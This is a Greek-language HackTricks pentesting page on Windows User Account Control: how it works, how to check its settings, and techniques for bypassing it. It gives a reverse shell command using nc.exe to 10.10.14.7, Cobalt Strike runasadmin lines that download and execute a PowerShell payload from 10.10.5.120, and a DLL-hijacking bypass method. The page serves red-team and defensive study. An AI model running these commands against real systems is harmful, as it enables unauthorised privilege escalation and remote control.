# UAC - Έλεγχος Χρήστης Λογαριασμού

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ τρικς σας υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) στο github.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

Ο Έλεγχος Χρήστης Λογαριασμού (UAC) είναι μια λειτουργία που επιτρέπει μια **προτροπή συναίνεσης για αυξημένες δραστηριότητες**. Οι εφαρμογές έχουν διάφορα επίπεδα `ακεραιότητας` και ένα πρόγραμμα με **υψηλό επίπεδο** μπορεί να εκτελέσει εργασίες που **θα μπορούσαν να απειλήσουν το σύστημα**. Όταν ο UAC είναι ενεργοποιημένος, οι εφαρμογές και οι εργασίες εκτελούνται πάντα με το πλαίσιο ασφαλείας ενός λογαριασμού μη διαχειριστή, εκτός αν ένας διαχειριστής εξουσιοδοτήσει ρητά αυτές τις εφαρμογές/εργασίες να έχουν πρόσβαση στο σύστημα σε επίπεδο διαχειριστή. Είναι μια λειτουργία βολικότητας που προστατεύει τους διαχειριστές από ακούσιες αλλαγές, αλλά δεν θεωρείται όριο ασφαλείας.

Για περισσότερες πληροφορίες σχετικά με τα επίπεδα ακεραιότητας:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Όταν ο UAC είναι ενεργοποιημένος, ένας διαχειριστής χρήστης λαμβάνει 2 διαπιστευτήρια: ένα κλειδί χρήστη προτύπου, για να εκτελέσει κανονικές ενέργειες ως κανονικό επίπεδο, και ένα με προνόμια διαχειριστή.

Αυτή η [σελίδα](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) αναλύει πώς λειτουργεί ο UAC αναλυτικά και περιλαμβάνει τη διαδικασία σύνδεσης, την εμπειρία χρήστη και την αρχιτεκτονική του UAC. Οι διαχειριστές μπορούν να χρησιμοποιήσουν πολιτικές ασφαλείας για να διαμορφώσουν τον τρόπο λειτουργίας του UAC συγκεκριμένα για τον οργανισμό τους σε τοπικό επίπεδο (χρησιμοποιώντας το secpol.msc) ή να τις διαμορφώσουν και να τις εφαρμόσουν μέσω αντικειμένων πολιτικής ομάδας (GPO) σε ένα περιβάλλον τομέα Active Directory. Οι διάφορες ρυθμίσεις συζητούνται αναλυτικά [εδώ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Υπάρχουν 10 ρυθμίσεις πολιτικής ομ
### Θεωρία Παράκαμψης UAC

Ορισμένα προγράμματα αυξάνουν αυτόματα τα δικαιώματά τους εάν ο χρήστης ανήκει στην ομάδα διαχειριστών. Αυτά τα εκτελέσιμα αρχεία έχουν μέσα στα _**Μεταδεδομένα**_ τους την επιλογή _**autoElevate**_ με την τιμή _**True**_. Το εκτελέσιμο αρχείο πρέπει επίσης να έχει υπογραφεί από τη Microsoft.

Έτσι, για να παρακάμψουν το UAC (να αναβαθμίσουν από το επίπεδο μεσαίας ακεραιότητας σε υψηλή), ορισμένοι επιτιθέμενοι χρησιμοποιούν αυτού του είδους τα εκτελέσιμα αρχεία για να εκτελέσουν αυθαίρετο κώδικα, καθώς αυτός θα εκτελεστεί από ένα διεργασία υψηλής ακεραιότητας.

Μπορείτε να ελέγξετε τα _**Μεταδεδομένα**_ ενός εκτελέσιμου αρχείου χρησιμοποιώντας το εργαλείο _**sigcheck.exe**_ από τα Sysinternals. Και μπορείτε να δείτε το επίπεδο ακεραιότητας των διεργασιών χρησιμοποιώντας το _Process Explorer_ ή το _Process Monitor_ (των Sysinternals).

### Έλεγχος UAC

Για να επιβεβαιώσετε εάν το UAC είναι ενεργοποιημένο, εκτελέστε:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Αν είναι **`1`**, τότε το UAC είναι **ενεργοποιημένο**, αν είναι **`0`** ή **δεν υπάρχει**, τότε το UAC είναι **ανενεργό**.

Στη συνέχεια, ελέγξτε **ποιο επίπεδο** έχει ρυθμιστεί:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Αν **`0`**, τότε το UAC δεν θα ζητήσει επιβεβαίωση (σαν να είναι **απενεργοποιημένο**)
* Αν **`1`**, ο διαχειριστής θα ζητηθεί να εισάγει όνομα χρήστη και κωδικό για να εκτελέσει το δυαδικό αρχείο με υψηλά δικαιώματα (στην Ασφαλή Επιφάνεια)
* Αν **`2`** (**Πάντα να με ειδοποιεί**) το UAC θα ζητά πάντα επιβεβαίωση από τον διαχειριστή όταν προσπαθεί να εκτελέσει κάτι με υψηλά δικαιώματα (στην Ασφαλή Επιφάνεια)
* Αν **`3`** όπως `1` αλλά δεν είναι απαραίτητο στην Ασφαλή Επιφάνεια
* Αν **`4`** όπως `2` αλλά δεν είναι απαραίτητο στην Ασφαλή Επιφάνεια
* Αν **`5`**(**προεπιλογή**), θα ζητήσει από τον διαχειριστή να επιβεβαιώσει την εκτέλεση μη Windows δυαδικών αρχείων με υψηλά δικαιώματα

Στη συνέχεια, πρέπει να ελέγξετε την τιμή του **`LocalAccountTokenFilterPolicy`**\
Αν η τιμή είναι **`0`**, τότε μόνο ο χρήστης με RID 500 (**ενσωματωμένος Διαχειριστής**) μπορεί να εκτελέσει εργασίες διαχειριστή χωρίς UAC, και αν είναι `1`, **όλοι οι λογαριασμοί μέσα στην ομάδα "Διαχειριστές"** μπορούν να τις εκτελέσουν.

Και, τέλος, ελέγξτε την τιμή του κλειδιού **`FilterAdministratorToken`**\
Αν είναι **`0`**(προεπιλογή), ο ενσωματωμένος λογαριασμός Διαχειριστής μπορεί να εκτελέσει εργασίες απομακρυσμένης διαχείρισης και αν είναι **`1`**, ο ενσωματωμένος λογαριασμός Διαχειριστής **δεν μπορεί** να εκτελέσει εργασίες απομακρυσμένης διαχείρισης, εκτός αν η τιμή του `LocalAccountTokenFilterPolicy` είναι `1`.

#### Σύνοψη

* Αν `EnableLUA=0` ή **δεν υπάρχει**, **κανένα UAC για κανέναν**
* Αν `EnableLua=1` και **`LocalAccountTokenFilterPolicy=1` , Κανένα UAC για κανέναν**
* Αν `EnableLua=1` και **`LocalAccountTokenFilterPolicy=0` και `FilterAdministratorToken=0`, Κανένα UAC για το RID 500 (Ενσωματωμένος Διαχειριστής)**
* Αν `EnableLua=1` και **`LocalAccountTokenFilterPolicy=0` και `FilterAdministratorToken=1`, UAC για όλους**

Όλες αυτές οι πληροφορίες μπορούν να συλλεχθούν χρησιμοποιώντας το **metasploit** module: `post/windows/gather/win_privs`

Μπορείτε επίσης να ελέγξετε τις ομάδες του χρήστη σας και να πάρετε το επίπεδο ακεραιότητας:
```
net user %username%
whoami /groups | findstr Level
```
## Παράκαμψη του UAC

{% hint style="info" %}
Σημείωση ότι αν έχετε γραφική πρόσβαση στο θύμα, η παράκαμψη του UAC είναι απλή, καθώς μπορείτε απλά να κάνετε κλικ στο "Ναι" όταν εμφανίζεται το παράθυρο UAC.
{% endhint %}

Η παράκαμψη του UAC απαιτείται στην ακόλουθη κατάσταση: **το UAC είναι ενεργοποιημένο, η διεργασία σας εκτελείται σε περιβάλλον με μεσαία ακεραιότητα και ο χρήστης σας ανήκει στην ομάδα διαχειριστών**.

Είναι σημαντικό να αναφέρουμε ότι είναι **πολύ πιο δύσκολο να παρακάμψετε το UAC αν είναι στο υψηλότερο επίπεδο ασφαλείας (Πάντα) από ό,τι αν είναι σε οποιοδήποτε άλλο επίπεδο (Προεπιλογή).**

### Απενεργοποίηση του UAC

Εάν το UAC είναι ήδη απενεργοποιημένο (`ConsentPromptBehaviorAdmin` είναι **`0`**), μπορείτε να **εκτελέσετε ένα αντίστροφο κέλυφος με δικαιώματα διαχειριστή** (υψηλό επίπεδο ακεραιότητας) χρησιμοποιώντας κάτι όπως:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Παράκαμψη UAC με αντιγραφή διαπιστευτηρίου

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Πολύ βασική "παράκαμψη" UAC (πλήρης πρόσβαση στο σύστημα αρχείων)

Αν έχετε ένα κέλυφος με έναν χρήστη που ανήκει στην ομάδα Διαχειριστών, μπορείτε να **προσαρτήσετε το κοινόχρηστο C$** μέσω SMB (σύστημα αρχείων) τοπικά σε ένα νέο δίσκο και θα έχετε **πρόσβαση σε όλα τα αρχεία του συστήματος αρχείων** (ακόμη και στον φάκελο του Διαχειριστή).

{% hint style="warning" %}
**Φαίνεται ότι αυτό το κόλπο δεν λειτουργεί πλέον**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Παράκαμψη UAC με το Cobalt Strike

Οι τεχνικές του Cobalt Strike θα λειτουργήσουν μόνο εάν το UAC δεν έχει οριστεί στο μέγιστο επίπεδο ασφαλείας.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Το Empire και το Metasploit** έχουν επίσης αρκετά εργαλεία για την **παράκαμψη** του **UAC**.

### KRBUACBypass

Τεκμηρίωση και εργαλείο στο [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Εκμετάλλευση παράκαμψης UAC

[**UACME**](https://github.com/hfiref0x/UACME) το οποίο είναι μια **συλλογή** από αρκετές εκμεταλλεύσεις παράκαμψης UAC. Σημειώστε ότι θα πρέπει να **μεταγλωττίσετε το UACME χρησιμοποιώντας το Visual Studio ή το msbuild**. Η μεταγλώττιση θα δημιουργήσει αρκετά εκτελέσιμα αρχεία (όπως το `Source\Akagi\outout\x64\Debug\Akagi.exe`), θα πρέπει να γνωρίζετε **ποιο χρειάζεστε**.\
Θα πρέπει να **είστε προσεκτικοί** επειδή ορισμένες παρακάμψεις θα **ενεργοποιήσουν άλλα προγράμματα** που θα **ειδοποιήσουν** τον **χρήστη** ότι κάτι συμβαίνει.

Το UACME έχει την **έκδοση κατασκευής από την οποία ξεκίνησε να λειτουργεί** κάθε τεχνική. Μπορείτε να αναζητήσετε μια τεχνική που επηρεάζει τις εκδόσεις σας:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Επίσης, χρησιμοποιώντας [αυτήν](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) τη σελίδα, μπορείτε να πάρετε την έκδοση των Windows `1607` από τις εκδόσεις του build.

#### Περισσότερες παρακάμψεις UAC

**Όλες** οι τεχνικές που χρησιμοποιούνται εδώ για την παράκαμψη του UAC **απαιτούν** ένα **πλήρες διαδραστικό κέλυφος** με το θύμα (ένα κοινό κέλυφος nc.exe δεν είναι αρκετό).

Μπορείτε να το πετύχετε χρησιμοποιώντας μια συνεδρία **meterpreter**. Μετακινηθείτε σε ένα **διεργασία** που έχει την τιμή **Session** ίση με **1**:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ θα πρέπει να λειτουργεί)

### Παράκαμψη UAC με GUI

Εάν έχετε πρόσβαση σε ένα **GUI, μπορείτε απλά να αποδεχτείτε την εντολή UAC** όταν τη λάβετε, δεν χρειάζεται πραγματικά μια παράκαμψη. Έτσι, η πρόσβαση σε ένα GUI θα σας επιτρέψει να παρακάμψετε το UAC.

Επιπλέον, εάν αποκτήσετε μια συνεδρία GUI που κάποιος χρησιμοποιούσε (πιθανώς μέσω RDP), υπάρχουν **ορισμένα εργαλεία που θα εκτελούνται ως διαχειριστής** από όπου μπορείτε να **εκτελέσετε** ένα **cmd** για παράδειγμα **ως διαχειριστής** απευθείας χωρίς να σας ζητηθεί ξανά από το UAC, όπως [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Αυτό μπορεί να είναι λίγο πιο **αόρατο**.

### Θορυβώδης παράκαμψη UAC με βίαιο brute-force

Εάν δεν σας ενδιαφέρει να είστε θορυβώδεις, μπορείτε πάντα να **εκτελέσετε κάτι όπως** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) που **ζητά να αναβαθμίσει τα δικαιώματα μέχρι ο χρήστης να το αποδεχτεί**.

### Η δική σας παράκαμψη - Βασική μεθοδολογία παράκαμψης UAC

Εάν ρίξετε μια ματιά στο **UACME**, θα διαπιστώσετε ότι **η πλειοψηφία των παρακαμπτήριων UAC καταχρώνται μια ευπάθεια Dll Hijacking** (κυρίως γράφοντας το κακόβουλο dll στο _C:\Windows\System32_). [Διαβάστε αυτό για να μάθετε πώς να βρείτε μια ευπάθεια Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking.md).

1. Βρείτε ένα δυαδικό που θα **αναβαθμίσει αυτόματα** (ελέγξτε ότι όταν εκτελείται, τρέχει σε υψηλό επίπεδο ακεραιότητας).
2. Με το procmon βρείτε γεγονότα "**NAME NOT FOUND**" που μπορεί να είναι ευάλωτα στο **DLL Hijacking**.
3. Πιθανώς θα χρειαστεί να **γράψετε** το DLL μέσα σε κάποια **προστατευμένα μονοπάτια** (όπως το C:\Windows\System32) όπου δεν έχετε δικαιώματα εγγραφής. Μπορείτε να παρακάμψετε αυτό χρησιμοποιώντας:
1. **wusa.exe**: Windows 7, 8 και 8.1. Επιτρέπει την εξαγωγή του περιεχομένου ενός αρχείου CAB μέσα σε προστατευμένα μονοπάτια (επειδή αυτό το εργαλείο εκτελείται από υψηλό επίπεδο ακεραιότητας).
2. **IFileOperation**: Windows 10.
4. Προετοιμάστε ένα **σενάριο** για να αντιγράψετε το DLL στο προστατευμένο μονοπάτι και να εκτελέσετε το ευάλωτο και αυτόματα αναβαθμισμένο δυαδικό.

### Άλλη τεχνική παράκαμψης UAC

Αποτελείται από το να παρακολουθείτε εάν ένα **αυτόματα αναβαθμιζόμενο δυαδικό** προσπαθεί να **διαβάσει** από τη **μητρώο** το **όνομα/διαδρομή** ενός **δυαδικού** ή **εντολής** που θα εκτελεστεί (αυτό είναι πιο ενδιαφέρον εάν το δυαδικό αναζητά αυτές τις πληροφορίες μέσα στο **HKCU**).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της παγκόσμιας κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/s
